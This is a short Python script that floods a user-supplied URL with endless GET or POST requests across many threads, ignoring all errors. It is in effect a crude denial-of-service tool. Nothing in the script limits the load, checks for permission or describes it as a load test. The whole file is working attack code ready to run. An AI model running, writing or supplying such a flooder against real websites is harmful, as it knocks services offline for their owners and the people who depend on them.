import requests
import threading
from sys import argv



if '--thread' in argv:
	thread = int(argv[argv.index('--thread')+1])

if '--url' in argv:
	url = argv[argv.index('--url')+1]

if '--post' in argv:
	mtd = 'post'

if '--get' in argv:
	mtd = 'get'


def start_post(url):
	while True:
		try:
			requests.post(url)
		except:
			pass


def start_get(url):
	while True:
		try:
			requests.get(url)
		except:
			pass


def thread_get(thread):
	for i in range(thread):
		t = threading.Thread(target = start_get, args = (url,))
		t.start()

def thread_post(thread):
	for i in range(thread):
		t = threading.Thread(target = start_post, args = (url,))
		t.start()

if mtd == 'get':
	thread_get(thread)

if mtd == 'post':
	thread_post(thread)
